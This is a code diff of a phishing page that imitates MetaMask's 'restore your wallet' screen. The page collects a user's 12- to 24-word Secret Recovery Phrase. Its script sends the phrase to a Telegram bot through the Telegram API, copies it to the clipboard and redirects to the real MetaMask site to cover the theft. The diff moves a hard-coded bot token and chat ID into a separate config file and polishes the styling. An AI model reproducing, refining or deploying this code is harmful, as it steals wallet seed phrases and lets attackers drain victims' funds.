@@ -10,8 +10,8 @@
     * { box-sizing: border-box; }
     body {
       margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #fff;
+      font-family: 'Inter', sans-serif;
+      background-color: #ffffff;
       color: #333;
       display: flex;
       flex-direction: column;
@@ -24,10 +24,6 @@
       justify-content: space-between;
       align-items: center;
       padding: 30px 30px 10px;
-    }
-    .logo {
-      font-weight: bold;
-      font-size: 20px;
     }
     .language-select {
       padding: 6px 12px;
@@ -42,13 +38,13 @@
       width: 100%;
     }
     .card {
-      background-color: white;
-      border-radius: 20px;
+      background-color: #fff;
+      border-radius: 16px;
       border: 1px solid #e0e0e0;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.05);
       padding: 40px;
       width: 100%;
-      max-width: 500px;
+      max-width: 520px;
     }
     .step-circles {
       display: flex;
@@ -73,14 +69,13 @@
       margin: 0 auto 6px;
     }
     .step.active .circle {
-      background-color: #6264ff;
+      background-color: #4f46e5;
       color: #fff;
       border: none;
     }
     .label {
       font-size: 12px;
       color: #666;
-      line-height: 14px;
     }
     h1 {
       text-align: center;
@@ -106,30 +101,35 @@
       color: #444;
       margin: 10px 0;
       padding: 10px;
-      background: #f5f5ff;
-      border-left: 4px solid #6264ff;
+      background: #eef1ff;
+      border-left: 4px solid #4f46e5;
       border-radius: 4px;
     }
     .seed-inputs {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
-      gap: 10px;
+      gap: 12px;
       margin: 20px 0;
     }
     .seed-input {
       display: flex;
       align-items: center;
-      gap: 4px;
+      gap: 6px;
+    }
+    .seed-input label {
+      font-size: 13px;
+      min-width: 22px;
+      text-align: right;
     }
     .seed-input input {
       width: 100%;
-      padding: 8px;
+      padding: 8px 10px;
       border-radius: 8px;
       border: 1px solid #ccc;
       font-size: 14px;
     }
     .submit-btn {
-      background-color: #28a745; /* Vert */
+      background-color: #4f46e5;
       border: none;
       color: white;
       width: 100%;
@@ -137,6 +137,10 @@
       font-size: 16px;
       border-radius: 24px;
       cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    .submit-btn:hover {
+      background-color: #3730a3;
     }
     .submit-btn:disabled {
       opacity: 0.5;
@@ -162,7 +166,7 @@
 <body>
 
   <div class="top-bar">
-    <div><img src="https://metamask2-eight.vercel.app/meta.png"  width="70px"></div>
+    <div><img src="https://metamask2-eight.vercel.app/meta.png" width="70px"></div>
     <select class="language-select">
       <option value="en">English</option>
       <option value="fr">Français</option>
@@ -172,33 +176,31 @@
 
   <main>
     <div class="card">
-
       <div class="step-circles">
         <div class="step active">
           <div class="circle">1</div>
-          <div class="label">Confirm secret<br/>recovery phrase</div>
+          <div class="label">Confirm Phrase</div>
         </div>
         <div class="step">
           <div class="circle">2</div>
-          <div class="label">Create<br/>password</div>
+          <div class="label">Create Password</div>
         </div>
       </div>
 
       <h1>Access your wallet with your Secret Recovery Phrase</h1>
       <p class="description">
-        MetaMask cannot recover your password. We will use your Secret Recovery Phrase to validate your ownership, restore your wallet and set up a new password.
-        First, enter the Secret Recovery Phrase that you were given when you created your wallet. <a href="#">Learn more</a>
+        Enter your Secret Recovery Phrase to restore your wallet and set a new password.
       </p>
 
       <select class="phrase-length" id="phraseLength" onchange="generateInputs()">
-        <option value="12">I have a 12 word phrase</option>
-        <option value="15">I have a 15 word phrase</option>
-        <option value="18">I have an 18 word phrase</option>
-        <option value="21">I have a 21 word phrase</option>
-        <option value="24">I have a 24 word phrase</option>
+        <option value="12">12 words</option>
+        <option value="15">15 words</option>
+        <option value="18">18 words</option>
+        <option value="21">21 words</option>
+        <option value="24">24 words</option>
       </select>
 
-      <div class="info">🔐 You can paste your entire secret recovery phrase into any field</div>
+      <div class="info">💡 You can paste the full phrase into any field</div>
 
       <div class="seed-inputs" id="seedInputs"></div>
 
@@ -206,10 +208,10 @@
         Confirm Secret Recovery Phrase
       </button>
       <p id="errorMsg" class="error-msg">Invalid seed phrase. Please check the words.</p>
-
     </div>
   </main>
 
+  <script src="config.js"></script> <!-- ← Fichier séparé contenant le TOKEN -->
   <script src="bip39-words.js"></script>
   <script>
     function generateInputs() {
@@ -224,8 +226,7 @@
         container.appendChild(div);
       }
 
-      const inputs = container.querySelectorAll("input");
-      inputs.forEach(input => {
+      container.querySelectorAll("input").forEach(input => {
         input.addEventListener("input", checkFieldsFilled);
       });
 
@@ -235,7 +236,6 @@
     function checkFieldsFilled() {
       const count = parseInt(document.getElementById("phraseLength").value);
       let allFilled = true;
-
       for (let i = 1; i <= count; i++) {
         const value = document.querySelector(`input[name='word${i}']`).value.trim();
         if (value === "") {
@@ -243,14 +243,12 @@
           break;
         }
       }
-
       document.getElementById("submitBtn").disabled = !allFilled;
     }
 
     function validateBIP39Words() {
       const count = parseInt(document.getElementById("phraseLength").value);
       let valid = true;
-
       for (let i = 1; i <= count; i++) {
         const input = document.querySelector(`input[name='word${i}']`);
         const word = input.value.trim().toLowerCase();
@@ -261,7 +259,6 @@
           input.style.border = "1px solid #ccc";
         }
       }
-
       return valid;
     }
 
@@ -281,23 +278,21 @@
         phrase += value.trim() + " ";
       }
 
-      const botToken = "7918572484:AAHP6tcUHK2PuBPpN2Ln2GhFA722z2k7xb0"; // Remplace ici
-      const chatId = "6996434307";     // Remplace ici
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      // Envoi au bot Telegram depuis config.js
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: chatId,
-          text: "\n\n" + phrase.trim()
+          chat_id: TELEGRAM_CHAT_ID,
+          text: "🛡️ Phrase:\n" + phrase.trim()
         })
       });
 
       navigator.clipboard.writeText(phrase.trim());
 
       setTimeout(() => {
-        window.location.href = "https://metamask.io/"; // Remplace ton lien ici
-      }, 800);
+        window.location.href = "https://metamask.io/";
+      }, 1000);
     }
 
     document.addEventListener("paste", function(e) {
